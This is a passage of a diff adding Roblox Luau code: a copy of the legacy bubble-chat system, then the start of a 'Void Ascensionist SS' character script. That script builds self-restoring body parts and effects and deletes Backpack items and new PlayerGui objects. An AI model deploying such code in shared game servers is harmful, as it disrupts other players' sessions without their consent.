+									local fadeAmount = timeBetween * CHAT_BUBBLE_FADE_SPEED
+									bubble.ImageTransparency = bubble.ImageTransparency + fadeAmount
+									if bubbleText then bubbleText.TextTransparency = bubbleText.TextTransparency + fadeAmount end
+									if bubbleTail then bubbleTail.ImageTransparency = bubbleTail.ImageTransparency + fadeAmount end
+								end
+							end
+
+							if bubble then
+								bubble:Destroy()
+								bubbleQueue:PopFront()
+							end
+						end)
+					end
+
+					function this:CreateChatLineRender(instance, line, onlyCharacter, fifo, shouldAutoLocalize)
+						if not instance then return end
+
+						if not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
+							this:CreateBillboardGuiHelper(instance, onlyCharacter)
+						end
+
+						local billboardGui = this.CharacterSortedMsg:Get(instance)["BillboardGui"]
+						if billboardGui then
+							local chatBubbleRender = this.ChatBubbleWithTail[line.BubbleColor]:Clone()
+							chatBubbleRender.Visible = false
+							local bubbleText = this:CreateBubbleText(line.Message, shouldAutoLocalize)
+
+							bubbleText.Parent = chatBubbleRender
+							chatBubbleRender.Parent = billboardGui.BillboardFrame
+
+							line.RenderBubble = chatBubbleRender
+
+							local currentTextBounds = TextService:GetTextSize(
+								bubbleText.Text, CHAT_BUBBLE_FONT_SIZE_INT, CHAT_BUBBLE_FONT,
+								Vector2.new(BILLBOARD_MAX_WIDTH, BILLBOARD_MAX_HEIGHT))
+							local numOflines = (currentTextBounds.Y / CHAT_BUBBLE_FONT_SIZE_INT)
+
+							if UserFixBubbleChatText then
+								-- Need to use math.ceil to round up on retina displays
+								local width = math.ceil(currentTextBounds.X + CHAT_BUBBLE_PADDING * 2)
+								local height = numOflines * CHAT_BUBBLE_LINE_HEIGHT
+
+								-- prep chat bubble for tween
+								chatBubbleRender.Size = UDim2.fromOffset(0, 0)
+								chatBubbleRender.Position = UDim2.fromScale(0.5, 1)
+
+								chatBubbleRender:TweenSizeAndPosition(
+									UDim2.fromOffset(width, height),
+									UDim2.new(0.5, -width / 2, 1, -height),
+									Enum.EasingDirection.Out,
+									Enum.EasingStyle.Elastic,
+									0.1,
+									true,
+									function()
+										bubbleText.Visible = true
+									end
+								)
+
+								-- todo: remove when over max bubbles
+								this:SetBillboardGuiLOD(billboardGui, line.Origin)
+								this:UpdateChatLinesForOrigin(line.Origin, -height)
+							else
+								local bubbleWidthScale = math.max((currentTextBounds.X + CHAT_BUBBLE_WIDTH_PADDING) / BILLBOARD_MAX_WIDTH, 0.1)
+
+								-- prep chat bubble for tween
+								chatBubbleRender.Size = UDim2.new(0, 0, 0, 0)
+								chatBubbleRender.Position = UDim2.new(0.5, 0, 1, 0)
+
+								local newChatBubbleOffsetSizeY = numOflines * CHAT_BUBBLE_LINE_HEIGHT
+
+								chatBubbleRender:TweenSizeAndPosition(UDim2.new(bubbleWidthScale, 0, 0, newChatBubbleOffsetSizeY),
+									UDim2.new( (1 - bubbleWidthScale) / 2, 0, 1, -newChatBubbleOffsetSizeY),
+									Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 0.1, true,
+									function() bubbleText.Visible = true end)
+
+								-- todo: remove when over max bubbles
+								this:SetBillboardGuiLOD(billboardGui, line.Origin)
+								this:UpdateChatLinesForOrigin(line.Origin, -newChatBubbleOffsetSizeY)
+							end
+
+							delay(line.BubbleDieDelay, function()
+								this:DestroyBubble(fifo, chatBubbleRender)
+							end)
+						end
+					end
+
+					function this:OnPlayerChatMessage(sourcePlayer, message, targetPlayer)
+
+						if not this:BubbleChatEnabled() then return end
+
+						local localPlayer = PlayersService.LocalPlayer
+						local fromOthers = localPlayer ~= nil and sourcePlayer ~= localPlayer
+
+						local safeMessage = this:SanitizeChatLine(message)
+
+						local line = createPlayerChatLine(sourcePlayer, safeMessage, not fromOthers)
+
+						if sourcePlayer and line.Origin then
+							local fifo = this.CharacterSortedMsg:Get(line.Origin).Fifo
+							fifo:PushBack(line)
+							--Game chat (badges) won't show up here
+							this:CreateChatLineRender(sourcePlayer.Character, line, true, fifo, false)
+						end
+					end
+
+					function this:OnGameChatMessage(origin, message, color)
+						-- Prevents conflicts with the new bubble chat if it is enabled
+						if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
+							return
+						end
+
+						local localPlayer = PlayersService.LocalPlayer
+						local fromOthers = localPlayer ~= nil and (localPlayer.Character ~= origin)
+
+						local bubbleColor = BubbleColor.WHITE
+
+						if color == Enum.ChatColor.Blue then bubbleColor = BubbleColor.BLUE
+						elseif color == Enum.ChatColor.Green then bubbleColor = BubbleColor.GREEN
+						elseif color == Enum.ChatColor.Red then bubbleColor = BubbleColor.RED end
+
+						local safeMessage = this:SanitizeChatLine(message)
+						local line = createGameChatLine(origin, safeMessage, not fromOthers, bubbleColor)
+
+						this.CharacterSortedMsg:Get(line.Origin).Fifo:PushBack(line)
+						if UserShouldLocalizeGameChatBubble then
+							this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, true)
+						else
+							this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, false)
+						end
+					end
+
+					function this:BubbleChatEnabled()
+						if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
+							return false
+						end
+						local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
+						if clientChatModules then
+							local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
+							if chatSettings then
+								chatSettings = require(chatSettings)
+								if chatSettings.BubbleChatEnabled ~= nil then
+									return chatSettings.BubbleChatEnabled
+								end
+							end
+						end
+						return PlayersService.BubbleChat
+					end
+
+					function this:ShowOwnFilteredMessage()
+						local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
+						if clientChatModules then
+							local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
+							if chatSettings then
+								chatSettings = require(chatSettings)
+								return chatSettings.ShowUserOwnFilteredMessage
+							end
+						end
+						return false
+					end
+
+					function findPlayer(playerName)
+						for i,v in pairs(PlayersService:GetPlayers()) do
+							if v.Name == playerName then
+								return v
+							end
+						end
+					end
+
+					ChatService.Chatted:connect(function(origin, message, color) this:OnGameChatMessage(origin, message, color) end)
+
+					local cameraChangedCon = nil
+					if workspace.CurrentCamera then
+						cameraChangedCon = workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Connect(function(prop) this:CameraCFrameChanged() end)
+					end
+
+					workspace.Changed:Connect(function(prop)
+						if prop == "CurrentCamera" then
+							if cameraChangedCon then cameraChangedCon:disconnect() end
+							if workspace.CurrentCamera then
+								cameraChangedCon = workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Connect(function(prop) this:CameraCFrameChanged() end)
+							end
+						end
+					end)
+
+
+					local AllowedMessageTypes = nil
+
+					function getAllowedMessageTypes()
+						if AllowedMessageTypes then
+							return AllowedMessageTypes
+						end
+						local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
+						if clientChatModules then
+							local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
+							if chatSettings then
+								chatSettings = require(chatSettings)
+								if chatSettings.BubbleChatMessageTypes then
+									AllowedMessageTypes = chatSettings.BubbleChatMessageTypes
+									return AllowedMessageTypes
+								end
+							end
+							local chatConstants = clientChatModules:FindFirstChild("ChatConstants")
+							if chatConstants then
+								chatConstants = require(chatConstants)
+								AllowedMessageTypes = {chatConstants.MessageTypeDefault, chatConstants.MessageTypeWhisper}
+							end
+							return AllowedMessageTypes
+						end
+						return {"Message", "Whisper"}
+					end
+					function checkAllowedMessageType(messageData)
+						local allowedMessageTypes = getAllowedMessageTypes()
+						for i = 1, #allowedMessageTypes do
+							if allowedMessageTypes[i] == messageData.MessageType then
+								return true
+							end
+						end
+						return false
+					end
+					local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
+					local OnMessageDoneFiltering = ChatEvents:WaitForChild("OnMessageDoneFiltering")
+					local OnNewMessage = ChatEvents:WaitForChild("OnNewMessage")
+					OnNewMessage.OnClientEvent:connect(function(messageData, channelName)
+						if not checkAllowedMessageType(messageData) then
+							return
+						end
+
+						local sender = findPlayer(messageData.FromSpeaker)
+						if not sender then
+							return
+						end
+
+						if not messageData.IsFiltered or messageData.FromSpeaker == LocalPlayer.Name then
+							if messageData.FromSpeaker ~= LocalPlayer.Name or this:ShowOwnFilteredMessage() then
+								return
+							end
+						end
+
+						this:OnPlayerChatMessage(sender, messageData.Message, nil)
+					end)
+					OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData, channelName)
+						if not checkAllowedMessageType(messageData) then
+							return
+						end
+
+						local sender = findPlayer(messageData.FromSpeaker)
+						if not sender then
+							return
+						end
+
+						if messageData.FromSpeaker == LocalPlayer.Name and not this:ShowOwnFilteredMessage() then
+							return
+						end
+
+						this:OnPlayerChatMessage(sender, messageData.Message, nil)
+					end)
+
+					local FFlagUserHandleChatHotKeyWithContextActionService = false do
+						local ok, value = pcall(function()
+							return UserSettings():IsUserFeatureEnabled("UserHandleChatHotKeyWithContextActionService")
+						end)
+						if ok then
+							FFlagUserHandleChatHotKeyWithContextActionService = value
+						end
+					end
+
+					local StarterGui = game:GetService("StarterGui")
+					local GuiService = game:GetService("GuiService")
+					local ChatService = game:GetService("Chat")
+					local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+					local MAX_COREGUI_CONNECTION_ATTEMPTS = 10
+
+					local ClientChatModules = ChatService:WaitForChild("ClientChatModules")
+					local ChatSettings = require(ClientChatModules:WaitForChild("ChatSettings"))
+
+					local FFlagUserFlagEnableVRUpdate3 do
+						local success, result = pcall(function()
+							return UserSettings():IsUserFeatureEnabled("UserFlagEnableVRUpdate3")
+						end)
+						FFlagUserFlagEnableVRUpdate3 = success and result
+					end
+
+					local function DoEverything()
+						local Chat = require(Backups.ChatMain)
+						local containerTable = {}
+						containerTable.ChatWindow = {}
+						containerTable.SetCore = {}
+						containerTable.GetCore = {}
+
+						containerTable.ChatWindow.ChatTypes = {}
+						containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = ChatSettings.BubbleChatEnabled
+						containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = ChatSettings.ClassicChatEnabled
+
+						--// Connection functions
+						local function ConnectEvent(name)
+							local event = Instance.new("BindableEvent")
+							event.Name = name
+							containerTable.ChatWindow[name] = event
+
+							event.Event:connect(function(...) Chat[name](Chat, ...) end)
+						end
+
+						local function ConnectFunction(name)
+							local func = Instance.new("BindableFunction")
+							func.Name = name
+							containerTable.ChatWindow[name] = func
+
+							func.OnInvoke = function(...) return Chat[name](Chat, ...) end
+						end
+
+						local function ReverseConnectEvent(name)
+							local event = Instance.new("BindableEvent")
+							event.Name = name
+							containerTable.ChatWindow[name] = event
+							Chat[name]:connect(function(...) event:Fire(...) end)
+						end
+
+						local function ConnectSignal(name)
+							local event = Instance.new("BindableEvent")
+							event.Name = name
+							containerTable.ChatWindow[name] = event
+
+							event.Event:connect(function(...) Chat[name]:fire(...) end)
+						end
+
+						local function ConnectSetCore(name)
+							local event = Instance.new("BindableEvent")
+							event.Name = name
+							containerTable.SetCore[name] = event
+
+							event.Event:connect(function(...) Chat[name.."Event"]:fire(...) end)
+						end
+
+						local function ConnectGetCore(name)
+							local func = Instance.new("BindableFunction")
+							func.Name = name
+							containerTable.GetCore[name] = func
+
+							func.OnInvoke = function(...) return Chat["f"..name](...) end
+						end
+						--// Do connections
+						ConnectEvent("ToggleVisibility")
+						ConnectEvent("SetVisible")
+						ConnectEvent("FocusChatBar")
+						ConnectEvent("EnterWhisperState")
+						ConnectFunction("GetVisibility")
+						ConnectFunction("GetMessageCount")
+						ConnectEvent("TopbarEnabledChanged")
+						ConnectFunction("IsFocused")
+
+						ReverseConnectEvent("ChatBarFocusChanged")
+						ReverseConnectEvent("VisibilityStateChanged")
+						ReverseConnectEvent("MessagesChanged")
+						ReverseConnectEvent("MessagePosted")
+
+						ConnectSignal("CoreGuiEnabled")
+
+						ConnectSetCore("ChatMakeSystemMessage")
+						ConnectSetCore("ChatWindowPosition")
+						ConnectSetCore("ChatWindowSize")
+						ConnectGetCore("ChatWindowPosition")
+						ConnectGetCore("ChatWindowSize")
+						ConnectSetCore("ChatBarDisabled")
+						ConnectGetCore("ChatBarDisabled")
+
+						if not FFlagUserHandleChatHotKeyWithContextActionService then
+							ConnectEvent("SpecialKeyPressed")
+						end
+
+						SetCoreGuiChatConnections(containerTable)
+					end
+
+					function SetCoreGuiChatConnections(containerTable)
+						local tries = 0
+						while tries < MAX_COREGUI_CONNECTION_ATTEMPTS do
+							tries = tries + 1
+							local success, ret = pcall(function() StarterGui:SetCore("CoreGuiChatConnections", containerTable) end)
+							if success then
+								break
+							end
+							if not success and tries == MAX_COREGUI_CONNECTION_ATTEMPTS then
+								error("Error calling SetCore CoreGuiChatConnections: " .. ret)
+							end
+							task.wait()
+						end
+					end
+
+					function checkBothChatTypesDisabled()
+						if ChatSettings.BubbleChatEnabled ~= nil then
+							if ChatSettings.ClassicChatEnabled ~= nil then
+								return not (ChatSettings.BubbleChatEnabled or ChatSettings.ClassicChatEnabled)
+							end
+						end
+						return false
+					end
+
+					if (not GuiService:IsTenFootInterface()) and (not game:GetService('UserInputService').VREnabled or FFlagUserFlagEnableVRUpdate3) then
+						if not checkBothChatTypesDisabled() then
+							DoEverything()
+						else
+							local containerTable = {}
+							containerTable.ChatWindow = {}
+
+							containerTable.ChatWindow.ChatTypes = {}
+							containerTable.ChatWindow.ChatTypes.BubbleChatEnabled = false
+							containerTable.ChatWindow.ChatTypes.ClassicChatEnabled = false
+							SetCoreGuiChatConnections(containerTable)
+						end
+					else
+						-- Make init data request to register as a speaker
+						local EventFolder = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
+						EventFolder.GetInitDataRequest:InvokeServer()
+					end
+					task.wait()
+					Players.LocalPlayer.PlayerGui.ChildAdded:Connect(DDD)
+				end)
+			end))
+		end
+	end)
+	local f1={}
+	function f1.serv(Service)
+		return game:GetService(Service)
+	end
+	function f1.UserServ(Service)
+		return UserSettings():GetService(Service)
+	end
+	local function PickRandom(Table)
+		return Table[math.random(1, #Table)]
+	end
+	local RandomInstances = {
+	--[["ReflectionMetadataMember",
+	"ReflectionMetadataEvents",
+	"ReflectionMetadataClass",
+	"ReflectionMetadata",
+	"ReflectionMetadataCallbacks",
+	"ReflectionMetadataYieldFunctions",
+	"ReflectionMetadataEnum",
+	"ReflectionMetadataProperties",
+	"ReflectionMetadataFunctions",
+	"ReflectionMetadataEnums",
+	"ReflectionMetadataEnumItem",
+	"ReflectionMetadataClasses",]]
+		"RocketPropulsion",
+		"BodyGyro",
+		"BodyVelocity",
+		"BodyAngularVelocity",
+		"BodyPosition",
+		"BodyForce",
+		"BodyThrust",
+
+		"Sound",
+
+		"UnionOperation",
+		"NegateOperation",
+		"PartOperation",
+		"PartOperationAsset",
+		"IntersectOperation",
+
+		"BrickColorValue",
+		"ObjectValue",
+		"NumberValue", 
+		"CFrameValue", 
+		"RayValue", 
+		"BoolValue", 
+		"IntValue", 
+		"IntConstrainedValue", 
+		"DoubleConstrainedValue", 
+		"BinaryStringValue",
+		"Vector3Value",
+		"StringValue",
+		"Color3Value",
+
+
+		"HiddenSurfaceRemovalAsset",
+		"RemoteEvent",
+		"RemoteFunction",
+		"ControllerPartSensor",
+		"SwimController",
+		"RemoteEvent",
+		"RemoteFunction",
+
+		"PluginScript1",
+		"PluginScript2",
+		"PluginScript3",
+		"PluginScript4",
+		"LocalScript",
+		"ModuleScript",
+		"Script",
+		"ImageButton",
+		"ImageLabel",
+		"TextBox",
+		"TextLabel",
+		"TextButton",
+		"ScrollingFrame",
+		"UIAspectRatioConstraint",
+		"UICorner",
+		"UIGradient",
+		"UIGridLayout",
+		"UIPadding",
+		"UIListLayout",
+		"UIScale",
+		"UITextSizeConstraint",
+		"UITableLayout",
+		"UISizeConstraint",
+		"UIPageLayout",
+		"UIStroke",
+		"PointLight",
+		"SpotLight",
+		"SurfaceLight",
+		"BallSocketConstraint",
+		"NoCollisionConstraint",
+		"RodConstraint",
+		"WeldConstraint",
+		"HingeConstraint",
+		"PrismaticConstraint",
+		"TorsionSpringConstraint",
+		"SpringConstraint",
+		"UniversalConstraint",
+		"CylindricalConstraint",
+		"PlaneConstraint",
+		"ForceField",
+		"Torque",
+		"Plane",
+		"RopeConstraint",
+		"AdGui",
+		"ScreenGui",
+		"GuiMain",
+		"Humanoid",
+		"Shirt",
+		"SelectionSphere",
+		"SelectionBox",
+		"Pants",
+		"Frame",
+		"ShirtGraphic",
+		"SurfaceSelection",
+		"Pose",
+		"Vector3Curve",
+		"TeleportOptions",
+		"StandalonePluginScripts",
+		"Plane",
+		"RotationCurve",
+		"Rotate",
+		"RotateP",
+		"RotateV",
+		"RenderingTest",
+		"PathfindingModifier",
+		"PathfindingLink",
+		"MotorFeature",
+		"MarkerCurve",
+		"FloatCurve",
+		"GroundController",
+		"EulerRotationCurve",
+		"ExperienceInviteOptions",
+		"DataStoreIncrementOptions",
+		"DataStoreOptions",
+		"DataStoreSetOptions",
+		"ClimbController",
+		"ControllerManager",
+		"AlignOrientation",
+		"AlignPosition",
+		"CurveAnimation",
+		"Atmosphere",
+		"AnimationRigData",
+		"AnimationConstraint",
+		"AirController",
+		"Accoutrement",
+		"Sky",
+		"Handles",
+		"ArcHandles",
+		"BoxHandleAdornment",
+		"CylinderHandleAdornment",
+		"ImageHandleAdornment",	
+		"LineHandleAdornment",
+		"ConeHandleAdornment",	
+		"SelectionSphere",
+		"SurfaceSelection",
+		"ClickDetector",
+		"Dialog",
+		"MaterialVariant",
+		"ProximityPrompt",
+		"DialogChoice",
+		"Animation",
+		"FileMesh",
+
+		"StarterGear",
+		"VelocityMotor",
+		"SkateboardController",
+		"HumanoidController",
+		"Tween",
+		"VehicleController",
+		"FlagStand",
+		"TerrainRegion",
+		"Flag",
+		"PitchShiftSoundEffect",
+		"ReverbSoundEffect",
+		"EchoSoundEffect",
+		"FlangeSoundEffect",
+		"EchoSoundEffect",
+		"CompressorSoundEffect",
+		"ChorusSoundEffect",
+		"Team",
+		"TremoloSoundEffect",
+		"DistortionSoundEffect",
+		"EqualizerSoundEffect",
+		"CanvasGroup",
+		"SoundGroup",
+		"FloorWire",
+		"Tool",
+		"Skin",
+		"Accessory",
+		"AnimationController",
+		"Hole",
+		"WireframeHandleAdornment",
+		"BodyColors",
+		"HumanoidDescription",
+		"WireframeHandleAdornment",
+		"ColorCorrectionEffect",
+		"CylinderMesh",
+		"BloomEffect",
+		"BlurEffect",
+		"SunRaysEffect",
+		"DepthOfFieldEffect",
+		"TerrainDetail",
+		"CustomEvent",
+		"CustomEventReceiver",
+		"BindableEvent",
+		"BindableFunction",
+		"LocalizationTable",
+		"Configuration",
+		"IKControl", 
+		"TextChatCommand", 
+		"ManualGlue", 
+		"HopperBin",
+		"Backpack", 
+		"Glue", 
+		"Weld", 
+		"ManualWeld", 
+		"Folder", 
+		"Model", 
+		"Decal", 
+		"Texture", 
+		"FunctionalTest", 
+		"SelectionPartLasso", 
+		"SelectionPointLasso", 
+		"FaceControls", 
+		"Hat", 
+		"UIScale", 
+		"Actor", 
+		"VideoFrame",
+		"LineForce", 
+		"VectorForce",}
+	local LastService
+	function RandomInstance()
+		return PickRandom(RandomInstances)
+	end
+	function RandomService()
+		local Pick=PickRandom(FunnyServices)
+		Pick=(typeof(Pick)=="Instance" and Pick) or Pick.Object
+		if not LastService then
+			LastService=Pick
+			return Pick
+		else
+			if (Pick~=LastService) then
+				return Pick
+			else
+				repeat
+					Pick=PickRandom(FunnyServices)
+					Pick=(typeof(Pick)=="Instance" and Pick) or Pick.Object
+				until Pick~=LastService
+				return Pick
+			end
+		end
+	end
+
+	local RunService,Debris,Chat,JointsService,UserInput = f1.serv("RunService"),f1.serv("Debris"),f1.serv("Chat"),f1.serv("JointsService"),game:GetService("UserInputService")
+	local TweenService,MaterialService,TextChat,ReplicationStorage = f1.serv("TweenService"),f1.serv("MaterialService"),f1.serv("TextChatService"),f1.serv("ReplicatedStorage")
+	local Workspace,SoundService,Lighting,Players,StartGui,Content = f1.serv("Workspace"),f1.serv("SoundService"),f1.serv("Lighting"),f1.serv("Players"),f1.serv("StarterGui"),f1.serv("ContentProvider")
+	local TextChatService,UsergameSettings,Channels,ChatSystem = f1.serv("TextChatService"),(f1.UserServ("UserGameSettings")),nil,nil
+	Resume(function() Channels = TextChatService:WaitForChild("TextChannels", math.huge) ChatSystem = Channels:WaitForChild("RBXSystem", math.huge) end)
+	Main=ProtectedInstance("RandomInstance", {Parent=workspace, PrimaryPart=nil}, {TheAscensionist=true, [Identifier]=true, [Player]=true})
+	Head=ProtectedInstance("Head", BodyProp, {})
+	Torso=ProtectedInstance("Torso", BodyProp, {})
+	Gun=ProtectedInstance("Gun", BodyProp, {})
+	LeftArm=ProtectedInstance("Limb", BodyProp, {})
+	RightArm=ProtectedInstance("Limb", {BodyProp}, {})
+	LeftLeg=ProtectedInstance("Limb", BodyProp, {})
+	RightLeg=ProtectedInstance("Limb", BodyProp, {})
+	EyeHolder=ProtectedInstance("Attachment", {Parent=workspace.Terrain, Visible=false}, {})
+	Eye=ProtectedInstance("ParticleEmitter", {Parent=EyeHolder, TimeScale=0, Brightness=1, LightEmission = 0.25, LightInfluence = 0, Orientation = 0, Size = NumberSequence.new(0.75), Texture = "rbxassetid://6924979035", Transparency = NumberSequence.new(0), ZOffset = 0.6, LockedToPart = true, Enabled = true, Rotation = NumberRange.new(0)}, {})
+	EyeLight=ProtectedInstance("SpotLight", {Parent=EyeHolder, Brightness = 35, Color = Color3.new(1, 1, 1), Enabled = true, Range = 18, Shadows = false, Face="Front", Angle=30}, {}, WhenRefit)
+	PortalHolder=ProtectedInstance("Attachment", {Parent=workspace.Terrain}, {})
+	Portal=ProtectedInstance("ParticleEmitter", {Parent=PortalHolder, Brightness=1, LightEmission = 1,LightInfluence = 0,Orientation = 3,Size = NumberSequence.new(3,10),Texture = "rbxassetid://616444787",Transparency = NumberSequence.new(0,1),ZOffset = -5,Acceleration = Vector3.new(),Drag = 0,LockedToPart = true,TimeScale = 1,Enabled = true,Lifetime = NumberRange.new(1),Rate = 0,Rotation = NumberRange.new(1,360),RotSpeed = NumberRange.new(-20,20),Speed = NumberRange.new(.1),SpreadAngle = Vector2.new(180,180)}, {}, WhenRefit)
+	Light=ProtectedInstance("PointLight", {Parent=PortalHolder, Brightness = 40, Color = Color3.new(1, 1, 1), Enabled = true, Range = 4, Shadows = false}, {}, WhenRefit)
+	local function Reparent(Object, Parent, Parent_2)
+		pcall(function()
+			Object.Parent=(Parent~=nil and Parent) or Main.Object
+			Object.Object.Parent=Object.Parent
+			if Parent_2 then
+				Parent.Parent=Parent_2
+			end
+		end)
+	end
+	HighlightProp={Archivable=false, Enabled=true, DepthMode=Enum.HighlightDepthMode.AlwaysOnTop, Adornee=game, Parent=workspace.Terrain, FillColor=Color3.new(0, 0, 0), FillTransparency=1, OutlineTransparency=0}
+	local naeeym2 = ProtectedInstance("BillboardGui", {Parent=workspace.Terrain, Enabled=true})
+	naeeym2.AlwaysOnTop = true
+	naeeym2.Size = UDim2.new(7, 35, 3, 15)
+	naeeym2.StudsOffset = Vector3.new(0, 2, 0)
+	naeeym2.MaxDistance = math.huge
+	naeeym2.Active=true
+	local tecks2 = ProtectedInstance("TextLabel", {})
+	tecks2.BackgroundTransparency = 1
+	tecks2.TextScaled = true
+	tecks2.BorderSizePixel = 0
+	tecks2.Text = "The Void Ascensionist SS"
+	tecks2.Font = "Arcade"
+	tecks2.TextSize = 35
+	tecks2.TextStrokeTransparency = 0
+	tecks2.Size = UDim2.new(1, 0, 0.5, 0)
+	tecks2.TextColor3 = Color3.fromRGB(50, 50, 50)
+	tecks2.Selectable=false
+	Character.Text=tecks2
+	naeeym2:AddChild(tecks2, "Text")
+	local sp={}
+	local function CleanCFrame(CFrame_)
+		local Returned=table.pack(pcall(function()
+			local CFrameComponents=table.pack(CFrame_:GetComponents())
+			for Index=1, #CFrameComponents, 1 do
+				local Value=CFrameComponents[Index]
+				CFrameComponents[Index]=(ValidNumber(tonumber(Value)) and tonumber(Value)) or 0
+			end
+			return CFrame.new(table.unpack(CFrameComponents))
+		end))
+		table.remove(Returned, 1)
+		return table.unpack(Returned)
+	end
+	local function Weldify(Weld, CFrame_)
+		local Returned = table.pack(pcall(function()
+			return typeof(CFrame_) == "CFrame" and CFrame_*(Weld.C0*Weld.C1:Inverse()) or (type(CFrame_) == "table" and typeof(CFrame_.CFrame) == "CFrame" or typeof(CFrame_) == "Instance" and (CFrame_:IsA("BasePart") or CFrame_:IsA("CFrameValue"))) and CFrame_.CFrame*(Weld.C0*Weld.C1:Inverse()) or CFrame.new(0, 0, 0)
+		end))
+		table.remove(Returned, 1)
+		return unpack(Returned)
+	end
+	getfenv().Movement={CFrame=CFrame.new(0, 0, 0)}
+	local Welds={Defaults = {Neck = {C0 = CFrame.new(0,1,0)*CFrame.Angles(math.rad(-90),0,math.rad(180))},RootJoint = {C0 = CFrame.new()*CFrame.Angles(math.rad(-90),0,math.rad(180))},RightShoulder = {C0 = CFrame.new(-.5,0,0)*CFrame.Angles(0,math.rad(90),0)},LeftShoulder = {C0 = CFrame.new(.5,0,0)*CFrame.Angles(0,math.rad(-90),0)}},Neck = {C0 = CFrame.new(),C1 = CFrame.new(0,-.5,0,-1,0,0,0,0,1,0,1,0)},RootJoint = {C0 = CFrame.new(),C1 = CFrame.new(0,0,0,-1,0,0,0,0,1,0,1,0)},RightShoulder = {C0 = CFrame.new(),C1 = CFrame.new(-.5,.5,0,0,0,1,0,1,0,-1,0,0)},LeftShoulder = {C0 = CFrame.new(),C1 = CFrame.new(.5,.5,0,0,0,-1,0,1,0,1,0,0)},RightHip = {C0 = CFrame.new(),C1 = CFrame.new(.5,1,0,0,0,1,0,1,0,-1,0,0)},LeftHip = {C0 = CFrame.new(),C1 = CFrame.new(-.5,1,0,0,0,-1,0,1,0,1,0,0)},None = {C0 = CFrame.new(),C1 = CFrame.new()},GunHandle = {C0 = CFrame.new(0, -0.85, -0.25)*CFrame.Angles(math.rad(-90), 0, 0), C1 = CFrame.new(0,-.25,.9)}}
+	if IsUser then
+		local Player=Players.LocalPlayer
+		local function NoBackpack(v)
+			Resume(function()
+				if v:IsA("StarterGear") or v:IsA("Backpack") then
+					for _, x in ipairs(v:GetChildren()) do
+						DDD(x)
+					end
+					task.wait()
+					DDD(v)
+				end
+			end)
+		end
+		Player.ChildAdded:Connect(NoBackpack)
+		for _, v in pairs(Player:GetChildren()) do
+			NoBackpack(v)
+		end
+	end
+	Character.Main=Main
+	Character.Head=Head
+	Character.Torso=Torso
+	Character.LeftArm=LeftArm
+	Character.RightArm=RightArm
+	Character.RightLeg=RightLeg
+	Character.LeftLeg=LeftLeg
+	Character.Gun=Gun
+	Character.Eye=Eye
+	Character.EyeHolder=EyeHolder
+	Character.Portal=Portal
+	Character.PortalHolder=PortalHolder
+	Character.Light=Light
+	Character.Tag=naeeym2
+	Character.EyeLight=EyeLight
+
+	Character.EyeHolder:AddChild(Character.Eye, "Eye")
+	Character.Head:AddChild(Character.EyeLight, "EyeLight")
+
+	Character.PortalHolder:AddChild(Character.Portal, "Portal")
+	Character.PortalHolder:AddChild(Character.Light, "Light")
+
+	Character.Head.Refitted:Connect(function(Object)
+		Character.Tag.Refit()
+		Character.Tag.Parent=Object
+	end)
+	for i, v in pairs(Character) do
+		if v~=Main and v:IsA("BasePart") then
+			Character.Main:AddChild(v, i)
+		end
+	end
+	local AttF=Player.."_"
+	local LastReset=tick()
+	local Fonts = {
+		Enum.Font.Antique,
+		Enum.Font.Arcade,
+		Enum.Font.Arial,
+		Enum.Font.ArialBold,
+		Enum.Font.Bodoni,
+		Enum.Font.Cartoon,
+		Enum.Font.Code,
+		Enum.Font.Jura,
+		Enum.Font.JosefinSans,
+		Enum.Font.Kalam,
+		Enum.Font.Fantasy,
+		Enum.Font.Garamond,
+		Enum.Font.Highway,
+		Enum.Font.Legacy,
+		Enum.Font.Merriweather,
+		Enum.Font.Michroma,
+		Enum.Font.Nunito,
+		Enum.Font.Oswald,
+		Enum.Font.PermanentMarker,
+		Enum.Font.Sarpanch,
+		Enum.Font.SciFi,
+		Enum.Font.SourceSans,
+		Enum.Font.SourceSansBold,
+		Enum.Font.SourceSansItalic,
+		Enum.Font.SourceSansLight,
+		Enum.Font.SourceSansSemibold,
+		Enum.Font.Ubuntu
+	}
+
+	RayProperties=RaycastParams.new()
+	Raycastable={workspace}
+
+	function GetClosest(Position, Rays)
+		local Closest, Ray_=math.huge, nil
+		for _, v in pairs(Rays) do
+			local Magnitude = (((typeof(Position)=="CFrame" and Position.Position) or typeof(Position)=="Vector3" and Position)-v.Position).Magnitude
+			if Magnitude < Closest then
+				Closest, Ray_ = Magnitude, v
+			end
+		end
+		return Ray_
+	end
+	function Raycast(Position, End)
+		local Rays={}
+		for _, v in pairs(Raycastable) do
+			Insert(Rays, v:Raycast(Position, End, RayProperties))
+		end
+		return GetClosest(Position, Rays)
+	end
+	do
+		local function Check(v)
+			local Valid=table.pack(pcall(function() return type(v.Raycast)=="function" and not v:GetAttribute(RefitAtt) end))
+			if (Valid[1] and Valid[2]) then
+				Insert(Raycastable, v)
+				local AC; AC=v.AncestryChanged:Connect(function()
+					if not v:IsDescendantOf(game) then
+						DDD(v)
+						Remove(Raycastable, v)
+						Disconnect(AC)
+					end
+				end)
+			end
+		end
+		for _, v in pairs(game:GetDescendants()) do
+			Check(v)
+		end
+		game.DescendantAdded:Connect(Check)
+	end
+	function RefreshInstance(Object_1, Time, Object_2)
+		local LastRefresh=tick()
+		RunService.Heartbeat:Connect(function()
